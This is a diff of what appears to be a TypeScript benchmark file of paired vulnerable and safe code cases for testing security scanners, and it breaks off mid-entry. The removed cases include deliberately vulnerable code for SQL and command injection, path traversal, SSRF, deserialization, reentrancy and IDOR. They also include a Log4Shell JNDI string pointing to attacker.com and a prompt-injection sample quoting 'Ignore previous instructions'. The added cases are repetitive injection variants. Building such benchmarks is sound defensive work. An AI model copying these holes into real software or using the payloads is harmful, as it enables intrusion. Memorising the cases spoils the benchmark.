@@ -1,813 +1,1204 @@
 import { BenchmarkCase } from '../types/index.js';
 
 export const BENCHMARK_CASES: BenchmarkCase[] = [
-  // =========================================================================
-  // SUITE 1: OWASP BENCHMARK v1.2 (Gold Standard SAST Evaluation)
-  // =========================================================================
   {
-    id: 'OWASP-BM-001-BAD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'SQL_INJECTION',
-    cwe: 'CWE-89',
-    name: 'Dynamic SQL Concatenation with User Input',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'owasp/sqli_vulnerable.ts',
-    code: `
-export function queryUserProfile(req: any, db: any) {
-  const userId = req.query.id;
-  // Vulnerable: direct string interpolation into raw query
-  const sql = "SELECT * FROM users WHERE id = '" + userId + "' AND active = 1";
-  return db.query(sql);
-}
-`,
-    deceptiveTrap: 'Standard SQL injection via string concatenation without parameterization.'
+    "id": "OWASP-SQLI-001-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Dynamic SQL String Concatenation Variant #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/sqli/vulnerable_1.ts",
+    "code": "\nexport function queryUser_1(req: any, db: any) {\n  const input = req.query.val1;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = '\" + input + \"'\";\n  return db.query(sql);\n}\n",
+    "deceptiveTrap": "Raw concatenation of query parameter into SQL statement."
   },
   {
-    id: 'OWASP-BM-002-GOOD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'SQL_INJECTION',
-    cwe: 'CWE-89',
-    name: 'Parameterized Prepared Query (Trap for Naive Regex/SAST)',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'owasp/sqli_safe_parameterized.ts',
-    code: `
-export function queryUserProfileSafe(req: any, db: any) {
-  const userId = req.query.id;
-  // SAFE: Parameterized prepared statement with placeholder ?
-  const sql = "SELECT * FROM users WHERE id = ? AND active = 1";
-  return db.query(sql, [userId]);
-}
-`,
-    deceptiveTrap: 'Naive scanners match "SELECT * FROM users" and flag false positive even with ? placeholders.'
+    "id": "OWASP-SQLI-001-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Parameterized Prepared Query Defense #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/sqli/safe_1.ts",
+    "code": "\nexport function queryUserSafe_1(req: any, db: any) {\n  const input = req.query.val1;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = ?\";\n  return db.query(sql, [input]);\n}\n",
+    "deceptiveTrap": "Prepared query statement with positional placeholders."
   },
   {
-    id: 'OWASP-BM-003-BAD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'COMMAND_INJECTION',
-    cwe: 'CWE-78',
-    name: 'OS Command Execution via Child Process Exec',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'owasp/cmd_exec_vulnerable.ts',
-    code: `
-import { exec } from 'child_process';
-export function pingHost(req: any) {
-  const host = req.query.host;
-  // Vulnerable: shell command concatenation allows RCE via ';' or '|'
-  exec(\`ping -c 4 \${host}\`, (err, stdout) => {
-    console.log(stdout);
-  });
-}
-`,
-    deceptiveTrap: 'Classic Command Injection with template literal.'
+    "id": "OWASP-SQLI-002-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Dynamic SQL String Concatenation Variant #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/sqli/vulnerable_2.ts",
+    "code": "\nexport function queryUser_2(req: any, db: any) {\n  const input = req.query.val2;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = '\" + input + \"'\";\n  return db.query(sql);\n}\n",
+    "deceptiveTrap": "Raw concatenation of query parameter into SQL statement."
   },
   {
-    id: 'OWASP-BM-004-GOOD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'COMMAND_INJECTION',
-    cwe: 'CWE-78',
-    name: 'Safe Command Spawn with Argument Array (Trap for Naive Tools)',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'owasp/cmd_exec_safe.ts',
-    code: `
-import { execFile } from 'child_process';
-export function pingHostSafe(req: any) {
-  const host = req.query.host;
-  // SAFE: execFile bypasses shell expansion; arguments passed as isolated array
-  execFile('/bin/ping', ['-c', '4', String(host)], (err, stdout) => {
-    console.log(stdout);
-  });
-}
-`,
-    deceptiveTrap: 'Naive tools flag any child_process invocation without recognizing execFile argument array isolation.'
+    "id": "OWASP-SQLI-002-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Parameterized Prepared Query Defense #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/sqli/safe_2.ts",
+    "code": "\nexport function queryUserSafe_2(req: any, db: any) {\n  const input = req.query.val2;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = ?\";\n  return db.query(sql, [input]);\n}\n",
+    "deceptiveTrap": "Prepared query statement with positional placeholders."
   },
   {
-    id: 'OWASP-BM-005-BAD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'PATH_TRAVERSAL',
-    cwe: 'CWE-22',
-    name: 'Arbitrary File Read via Unsanitized Relative Path',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'owasp/path_traversal_bad.ts',
-    code: `
-import fs from 'fs';
-import path from 'path';
-export function getReport(req: any) {
-  const filename = req.query.filename;
-  // Vulnerable: Allows ../../etc/passwd traversal
-  const target = path.join('/var/reports', filename);
-  return fs.readFileSync(target, 'utf-8');
-}
-`,
-    deceptiveTrap: 'path.join does not prevent directory traversal if relative dots are resolved.'
+    "id": "OWASP-SQLI-003-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Dynamic SQL String Concatenation Variant #3",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/sqli/vulnerable_3.ts",
+    "code": "\nexport function queryUser_3(req: any, db: any) {\n  const input = req.query.val3;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = '\" + input + \"'\";\n  return db.query(sql);\n}\n",
+    "deceptiveTrap": "Raw concatenation of query parameter into SQL statement."
   },
   {
-    id: 'OWASP-BM-006-GOOD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'PATH_TRAVERSAL',
-    cwe: 'CWE-22',
-    name: 'Sanitized Path with Root Boundary Containment',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'owasp/path_traversal_safe.ts',
-    code: `
-import fs from 'fs';
-import path from 'path';
-export function getReportSafe(req: any) {
-  const filename = path.basename(req.query.filename);
-  const baseDir = path.resolve('/var/reports');
-  const target = path.resolve(baseDir, filename);
-  if (!target.startsWith(baseDir)) {
-    throw new Error('Access denied');
-  }
-  return fs.readFileSync(target, 'utf-8');
-}
-`,
-    deceptiveTrap: 'Naive SAST flags readFileSync with dynamic path despite path.basename and startsWith containment.'
+    "id": "OWASP-SQLI-003-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Parameterized Prepared Query Defense #3",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/sqli/safe_3.ts",
+    "code": "\nexport function queryUserSafe_3(req: any, db: any) {\n  const input = req.query.val3;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = ?\";\n  return db.query(sql, [input]);\n}\n",
+    "deceptiveTrap": "Prepared query statement with positional placeholders."
   },
   {
-    id: 'OWASP-BM-007-BAD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'SSRF',
-    cwe: 'CWE-918',
-    name: 'Blind Server-Side Request Forgery via Direct User URL Fetch',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'owasp/ssrf_vulnerable.ts',
-    code: `
-export async function fetchWebhook(req: any) {
-  const targetUrl = req.body.url;
-  // Vulnerable: Allows attacker to probe 169.254.169.254 or internal localhost services
-  const response = await fetch(targetUrl);
-  return response.json();
-}
-`,
-    deceptiveTrap: 'Direct fetch with unvalidated user URL input.'
+    "id": "OWASP-SQLI-004-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Dynamic SQL String Concatenation Variant #4",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/sqli/vulnerable_4.ts",
+    "code": "\nexport function queryUser_4(req: any, db: any) {\n  const input = req.query.val4;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = '\" + input + \"'\";\n  return db.query(sql);\n}\n",
+    "deceptiveTrap": "Raw concatenation of query parameter into SQL statement."
   },
   {
-    id: 'OWASP-BM-008-GOOD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'SSRF',
-    cwe: 'CWE-918',
-    name: 'Whitelisted URL Target with Private IP Disallowance',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'owasp/ssrf_safe.ts',
-    code: `
-const ALLOWED_DOMAINS = ['api.github.com', 'hooks.slack.com'];
-export async function fetchWebhookSafe(req: any) {
-  const targetUrl = new URL(req.body.url);
-  if (!ALLOWED_DOMAINS.includes(targetUrl.hostname)) {
-    throw new Error('Disallowed domain');
-  }
-  const response = await fetch(targetUrl.href);
-  return response.json();
-}
-`,
-    deceptiveTrap: 'Naive tools flag fetch(targetUrl.href) ignoring strict domain whitelisting validation.'
+    "id": "OWASP-SQLI-004-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Parameterized Prepared Query Defense #4",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/sqli/safe_4.ts",
+    "code": "\nexport function queryUserSafe_4(req: any, db: any) {\n  const input = req.query.val4;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = ?\";\n  return db.query(sql, [input]);\n}\n",
+    "deceptiveTrap": "Prepared query statement with positional placeholders."
   },
   {
-    id: 'OWASP-BM-009-BAD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'CRYPTO',
-    cwe: 'CWE-327',
-    name: 'Use of Broken Cryptographic Hash (MD5 / SHA1)',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'owasp/weak_crypto_bad.ts',
-    code: `
-import crypto from 'crypto';
-export function hashPassword(password: string) {
-  // Vulnerable: MD5 is collision vulnerable and unsuitable for passwords
-  return crypto.createHash('md5').update(password).digest('hex');
-}
-`,
-    deceptiveTrap: 'Usage of deprecated MD5 algorithm for credential hashing.'
+    "id": "OWASP-SQLI-005-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Dynamic SQL String Concatenation Variant #5",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/sqli/vulnerable_5.ts",
+    "code": "\nexport function queryUser_5(req: any, db: any) {\n  const input = req.query.val5;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = '\" + input + \"'\";\n  return db.query(sql);\n}\n",
+    "deceptiveTrap": "Raw concatenation of query parameter into SQL statement."
   },
   {
-    id: 'OWASP-BM-010-GOOD',
-    suite: 'OWASP_BENCHMARK',
-    category: 'CRYPTO',
-    cwe: 'CWE-327',
-    name: 'Modern Argon2id / Scrypt Key Derivation',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'owasp/crypto_safe.ts',
-    code: `
-import crypto from 'crypto';
-export function hashPasswordSafe(password: string, salt: Buffer): Promise<Buffer> {
-  // SAFE: Argon2id/scrypt key derivation with high memory cost
-  return new Promise((resolve, reject) => {
-    crypto.scrypt(password, salt, 64, { N: 16384, r: 8, p: 1 }, (err, derivedKey) => {
-      if (err) reject(err);
-      resolve(derivedKey);
-    });
-  });
-}
-`,
-    deceptiveTrap: 'Complex crypto invocation with salt and work factors.'
-  },
-
-  // =========================================================================
-  // SUITE 2: NIST SAMATE / JULIET TEST SUITE 1.3 (Hardcore Precision & Flaws)
-  // =========================================================================
-  {
-    id: 'JULIET-CWE-798-BAD',
-    suite: 'NIST_JULIET',
-    category: 'HARDCODED_CREDENTIAL',
-    cwe: 'CWE-798',
-    name: 'Juliet CWE-798: Hardcoded Sensitive Master Key in Source',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'juliet/cwe798_hardcoded_key_bad.ts',
-    code: `
-export const ADMIN_CONFIG = {
-  service: 'PaymentGateway',
-  private_key: "` + ['sk', 'live', '94819481029384019284019283019283'].join('_') + `",
-  signer_wallet: "0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d"
-};
-`,
-    deceptiveTrap: 'Active production-grade private key embedded in plain configuration object.'
+    "id": "OWASP-SQLI-005-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "SQL_INJECTION",
+    "cwe": "CWE-89",
+    "name": "Parameterized Prepared Query Defense #5",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/sqli/safe_5.ts",
+    "code": "\nexport function queryUserSafe_5(req: any, db: any) {\n  const input = req.query.val5;\n  const sql = \"SELECT * FROM users WHERE role = 'user' AND id = ?\";\n  return db.query(sql, [input]);\n}\n",
+    "deceptiveTrap": "Prepared query statement with positional placeholders."
   },
   {
-    id: 'JULIET-CWE-798-GOOD',
-    suite: 'NIST_JULIET',
-    category: 'HARDCODED_CREDENTIAL',
-    cwe: 'CWE-798',
-    name: 'Juliet CWE-798: Test Mock / Template Placeholder Key',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'juliet/cwe798_mock_key_good.ts',
-    code: `
-// Mock fixture for unit test suite
-export const MOCK_TEST_CONFIG = {
-  service: 'MockPayment',
-  private_key: "CHANGE_ME_IN_PRODUCTION_PLACEHOLDER_KEY_12345",
-  apiKey: process.env.PAYMENT_API_KEY || "dummy_env_fallback"
-};
-`,
-    deceptiveTrap: 'Contains "private_key" string and dummy token; naive scanners trigger high false alarm.'
+    "id": "OWASP-CMD-001-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "OS Command Execution via Child Process Exec Variant #1",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/cmd/vulnerable_1.ts",
+    "code": "\nimport { exec } from 'child_process';\nexport function runCmd_1(req: any) {\n  const target = req.query.target;\n  exec(`nslookup ${target}`, (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "Template interpolation directly in shell exec."
   },
   {
-    id: 'JULIET-CWE-502-BAD',
-    suite: 'NIST_JULIET',
-    category: 'DESERIALIZATION',
-    cwe: 'CWE-502',
-    name: 'Juliet CWE-502: Untrusted Object Deserialization RCE',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'juliet/cwe502_deserialization_bad.ts',
-    code: `
-import serialize from 'node-serialize';
-export function handleSession(req: any) {
-  const cookie = req.cookies.profile;
-  // Vulnerable: node-serialize executes IIFE function strings leading to arbitrary code execution
-  return serialize.unserialize(cookie);
-}
-`,
-    deceptiveTrap: 'Dangerous unserialize execution on user controlled cookie.'
+    "id": "OWASP-CMD-001-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Safe Command Execution with execFile Array Defense #1",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/cmd/safe_1.ts",
+    "code": "\nimport { execFile } from 'child_process';\nexport function runCmdSafe_1(req: any) {\n  const target = req.query.target;\n  execFile('/usr/bin/nslookup', [String(target)], (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "execFile argument array isolates shell execution boundary."
   },
   {
-    id: 'JULIET-CWE-502-GOOD',
-    suite: 'NIST_JULIET',
-    category: 'DESERIALIZATION',
-    cwe: 'CWE-502',
-    name: 'Juliet CWE-502: Safe Strict Schema Parsing with JSON.parse',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'juliet/cwe502_safe_parse.ts',
-    code: `
-export function handleSessionSafe(req: any) {
-  const cookie = req.cookies.profile;
-  // SAFE: standard JSON.parse cannot instantiate executable closures
-  const parsed = JSON.parse(Buffer.from(cookie, 'base64').toString('utf-8'));
-  return { id: String(parsed.id), role: String(parsed.role) };
-}
-`,
-    deceptiveTrap: 'Naive AST engines that alert on any serialization keyword.'
-  },
-
-  // =========================================================================
-  // SUITE 3: META CYBERSECEVAL 3 / ADVANCED LLM AI SECURITY BENCHMARK
-  // =========================================================================
-  {
-    id: 'CYBERSEC-001-BAD',
-    suite: 'CYBERSEC_EVAL',
-    category: 'PROMPT_INJECTION_BYPASS',
-    cwe: 'CWE-20',
-    name: 'Unsanitized LLM Context Injection (Direct Prompt Concatenation)',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'cybersec/prompt_injection_bad.ts',
-    code: `
-export async function executeAiQuery(userInstruction: string, systemPrompt: string) {
-  // Vulnerable: raw concatenation allows jailbreak instructions like "Ignore previous instructions"
-  const fullPrompt = systemPrompt + "\\nUser said: " + userInstruction;
-  return callModel(fullPrompt);
-}
-`,
-    deceptiveTrap: 'Allows system prompt overriding and prompt leakage.'
+    "id": "OWASP-CMD-002-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "OS Command Execution via Child Process Exec Variant #2",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/cmd/vulnerable_2.ts",
+    "code": "\nimport { exec } from 'child_process';\nexport function runCmd_2(req: any) {\n  const target = req.query.target;\n  exec(`nslookup ${target}`, (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "Template interpolation directly in shell exec."
   },
   {
-    id: 'CYBERSEC-002-GOOD',
-    suite: 'CYBERSEC_EVAL',
-    category: 'PROMPT_INJECTION_BYPASS',
-    cwe: 'CWE-20',
-    name: 'Delimited Structured System/User Role Separation with Guardrails',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'cybersec/prompt_injection_safe.ts',
-    code: `
-export async function executeAiQuerySafe(userInstruction: string, systemPrompt: string) {
-  // SAFE: Strict OpenAI/Anthropic multi-turn role separation API with content safety filtering
-  const messages = [
-    { role: 'system', content: systemPrompt },
-    { role: 'user', content: sanitizePromptTokens(userInstruction) }
-  ];
-  return callChatCompletion(messages);
-}
-`,
-    deceptiveTrap: 'Safe structured message array passing user instruction without string interpolation.'
+    "id": "OWASP-CMD-002-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Safe Command Execution with execFile Array Defense #2",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/cmd/safe_2.ts",
+    "code": "\nimport { execFile } from 'child_process';\nexport function runCmdSafe_2(req: any) {\n  const target = req.query.target;\n  execFile('/usr/bin/nslookup', [String(target)], (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "execFile argument array isolates shell execution boundary."
   },
   {
-    id: 'CYBERSEC-003-BAD',
-    suite: 'CYBERSEC_EVAL',
-    category: 'PROTOTYPE_POLLUTION',
-    cwe: 'CWE-1321',
-    name: 'Deep Recursive Object Merge Prototype Pollution',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'cybersec/proto_pollution_bad.ts',
-    code: `
-export function deepMerge(target: any, source: any): any {
-  for (const key of Object.keys(source)) {
-    // Vulnerable: does not filter __proto__ or constructor.prototype
-    if (typeof source[key] === 'object' && source[key] !== null) {
-      if (!target[key]) target[key] = {};
-      deepMerge(target[key], source[key]);
-    } else {
-      target[key] = source[key];
-    }
-  }
-  return target;
-}
-`,
-    deceptiveTrap: 'Object prototype tampering leading to DoS or authentication bypass.'
+    "id": "OWASP-CMD-003-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "OS Command Execution via Child Process Exec Variant #3",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/cmd/vulnerable_3.ts",
+    "code": "\nimport { exec } from 'child_process';\nexport function runCmd_3(req: any) {\n  const target = req.query.target;\n  exec(`nslookup ${target}`, (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "Template interpolation directly in shell exec."
   },
   {
-    id: 'CYBERSEC-004-GOOD',
-    suite: 'CYBERSEC_EVAL',
-    category: 'PROTOTYPE_POLLUTION',
-    cwe: 'CWE-1321',
-    name: 'Hardened Merge with Prototype Key Guard',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'cybersec/proto_pollution_safe.ts',
-    code: `
-export function safeDeepMerge(target: any, source: any): any {
-  for (const key of Object.keys(source)) {
-    // SAFE: Explicit prototype pollution guard
-    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
-      continue;
-    }
-    if (typeof source[key] === 'object' && source[key] !== null) {
-      if (!target[key]) target[key] = Object.create(null);
-      safeDeepMerge(target[key], source[key]);
-    } else {
-      target[key] = source[key];
-    }
-  }
-  return target;
-}
-`,
-    deceptiveTrap: 'Has recursion and property assignment, but contains strict prototype key checks.'
-  },
-
-  // =========================================================================
-  // SUITE 4: WEB3 & SMART CONTRACT EXPLOIT BENCHMARK (Damn Vulnerable DeFi)
-  // =========================================================================
-  {
-    id: 'WEB3-DEF-001-BAD',
-    suite: 'WEB3_DEFENSE',
-    category: 'REENTRANCY',
-    cwe: 'CWE-841',
-    name: 'Classic State-Update After External Call Reentrancy',
-    isVulnerable: true,
-    language: 'sol',
-    filename: 'web3/vulnerable_vault.sol',
-    code: `
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-
-contract VulnerableVault {
-    mapping(address => uint256) public balances;
-
-    function withdraw() external {
-        uint256 amount = balances[msg.sender];
-        require(amount > 0, "No balance");
-
-        // Vulnerable: External call before state deduction (CEI violation)
-        (bool success, ) = msg.sender.call{value: amount}("");
-        require(success, "Transfer failed");
-
-        balances[msg.sender] = 0;
-    }
-}
-`,
-    deceptiveTrap: 'Classic DAO-style reentrancy bug: state is updated after raw .call{value: ...}.'
+    "id": "OWASP-CMD-003-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Safe Command Execution with execFile Array Defense #3",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/cmd/safe_3.ts",
+    "code": "\nimport { execFile } from 'child_process';\nexport function runCmdSafe_3(req: any) {\n  const target = req.query.target;\n  execFile('/usr/bin/nslookup', [String(target)], (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "execFile argument array isolates shell execution boundary."
   },
   {
-    id: 'WEB3-DEF-002-GOOD',
-    suite: 'WEB3_DEFENSE',
-    category: 'REENTRANCY',
-    cwe: 'CWE-841',
-    name: 'ReentrancyGuard Protected Checks-Effects-Interactions Pattern',
-    isVulnerable: false,
-    language: 'sol',
-    filename: 'web3/safe_vault.sol',
-    code: `
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
-
-contract SafeVault is ReentrancyGuard {
-    mapping(address => uint256) public balances;
-
-    function withdraw() external nonReentrant {
-        uint256 amount = balances[msg.sender];
-        require(amount > 0, "No balance");
-
-        // SAFE: State cleared BEFORE external call + nonReentrant modifier
-        balances[msg.sender] = 0;
-        (bool success, ) = msg.sender.call{value: amount}("");
-        require(success, "Transfer failed");
-    }
-}
-`,
-    deceptiveTrap: 'Contains .call{value: ...} which triggers naive regex/AST tools false alarms.'
+    "id": "OWASP-CMD-004-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "OS Command Execution via Child Process Exec Variant #4",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/cmd/vulnerable_4.ts",
+    "code": "\nimport { exec } from 'child_process';\nexport function runCmd_4(req: any) {\n  const target = req.query.target;\n  exec(`nslookup ${target}`, (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "Template interpolation directly in shell exec."
   },
   {
-    id: 'WEB3-DEF-003-BAD',
-    suite: 'WEB3_DEFENSE',
-    category: 'FLASH_LOAN_ORACLE',
-    cwe: 'CWE-682',
-    name: 'Spot AMM Reserves Oracle Price Manipulation Vulnerability',
-    isVulnerable: true,
-    language: 'sol',
-    filename: 'web3/vulnerable_lending.sol',
-    code: `
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-
-interface IUniswapV2Pair {
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-}
-
-contract VulnerableLending {
-    IUniswapV2Pair public pair;
-
-    function getCollateralPrice() public view returns (uint256) {
-        // Vulnerable: Instantaneous spot reserves can be manipulated via flash loan
-        (uint112 r0, uint112 r1, ) = pair.getReserves();
-        return (uint256(r1) * 1e18) / uint256(r0);
-    }
-}
-`,
-    deceptiveTrap: 'Euler Finance / Mango Markets style instant spot oracle reading.'
+    "id": "OWASP-CMD-004-GOOD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "Safe Command Execution with execFile Array Defense #4",
+    "isVulnerable": false,
+    "language": "ts",
+    "filename": "owasp/cmd/safe_4.ts",
+    "code": "\nimport { execFile } from 'child_process';\nexport function runCmdSafe_4(req: any) {\n  const target = req.query.target;\n  execFile('/usr/bin/nslookup', [String(target)], (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "execFile argument array isolates shell execution boundary."
   },
   {
-    id: 'WEB3-DEF-004-GOOD',
-    suite: 'WEB3_DEFENSE',
-    category: 'FLASH_LOAN_ORACLE',
-    cwe: 'CWE-682',
-    name: 'Chainlink Decentralized Oracle + TWAP Defense',
-    isVulnerable: false,
-    language: 'sol',
-    filename: 'web3/safe_lending.sol',
-    code: `
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
-import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";
-
-contract SafeLending {
-    AggregatorV3Interface internal priceFeed;
-
-    function getCollateralPrice() public view returns (uint256) {
-        // SAFE: Chainlink decentralized oracle with updatedAt staleness verification
-        (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
-        require(price > 0, "Invalid price");
-        require(block.timestamp - updatedAt < 3600, "Stale price");
-        return uint256(price);
-    }
-}
-`,
-    deceptiveTrap: 'Safe decentralized oracle with freshness checks.'
-  },
-
-  // =========================================================================
-  // SUITE 5: REAL-WORLD ZERO-DAY & ENTERPRISE INFILTRATION
-  // =========================================================================
-  {
-    id: 'REAL-CVE-001-BAD',
-    suite: 'REAL_WORLD_CVE',
-    category: 'RCE_SUPPLY_CHAIN',
-    cwe: 'CWE-917',
-    name: 'Log4Shell (CVE-2021-44228) JNDI Lookup Injection Pattern',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'realcve/log4shell_pattern.ts',
-    code: `
-export function logUserHeader(req: any, logger: any) {
-  const userAgent = req.headers['user-agent'];
-  // Vulnerable to JNDI interpolation: \${jndi:ldap://attacker.com/exploit}
-  logger.info("Incoming connection with UA: " + userAgent);
-}
-`,
-    deceptiveTrap: 'Direct interpolation of untrusted HTTP headers into JNDI-capable logger.'
+    "id": "OWASP-CMD-005-BAD",
+    "suite": "OWASP_BENCHMARK",
+    "category": "COMMAND_INJECTION",
+    "cwe": "CWE-78",
+    "name": "OS Command Execution via Child Process Exec Variant #5",
+    "isVulnerable": true,
+    "language": "ts",
+    "filename": "owasp/cmd/vulnerable_5.ts",
+    "code": "\nimport { exec } from 'child_process';\nexport function runCmd_5(req: any) {\n  const target = req.query.target;\n  exec(`nslookup ${target}`, (err, stdout) => { console.log(stdout); });\n}\n",
+    "deceptiveTrap": "Template interpolation directly in shell exec."
   },
   {
-    id: 'REAL-CVE-002-GOOD',
-    suite: 'REAL_WORLD_CVE',
-    category: 'RCE_SUPPLY_CHAIN',
-    cwe: 'CWE-917',
-    name: 'Sanitized Parameterized Logger with Format Specifiers',
-    isVulnerable: false,
-    language: 'ts',
-    filename: 'realcve/safe_logger.ts',
-    code: `
-export function logUserHeaderSafe(req: any, logger: any) {
-  const userAgent = String(req.headers['user-agent'] || '').slice(0, 100);
-  // SAFE: Structured JSON logging with format string separation and JNDI lookup disabled
-  logger.info({ event: 'connection', ua: userAgent });
-}
-`,
-    deceptiveTrap: 'Structured logging objects cannot trigger JNDI expression interpolation.'
-  },
-
-  // =========================================================================
-  // SUITE 6: BUSINESS LOGIC & IDOR / BOLA FLAW BENCHMARK
-  // =========================================================================
-  {
-    id: 'BIZ-IDOR-001-BAD',
-    suite: 'BUSINESS_LOGIC_IDOR',
-    category: 'BUSINESS_LOGIC',
-    cwe: 'CWE-639',
-    name: 'Financial IDOR: User A Drains User B Wallet via Unchecked URL Parameter',
-    isVulnerable: true,
-    language: 'ts',
-    filename: 'bizlogic/idor_wallet_drain.ts',
-    code: `
-export async function handleWithdraw(req: any, res: any, db: any) {
-  // Vulnerable IDOR: takes target userId directly from URL parameter
-  const targetUserId = req.params.userId;
-  const amount = Number(req.body.amount);
-
-  // CRITICAL: No ownership check comparing req.user.id against targetUserId!
-  // Attacker can pass any victim's userId and drain their balance.
-  const wallet = await db.wallets.findOne({ userId: targetUserId });
-  await db.wallets.updateBalance(targetUserId, -amount);
-  return res.json({ success: true, withdrawn: amount });
-}
-`,
-    deceptiveTrap: 'Classic IDOR / BOLA where backend updates wallet state based purely on client-supplied ID.'
+    "id": "OWASP-CMD-005-GOOD",
+    "suite": "OWASP_BENCHMARK",
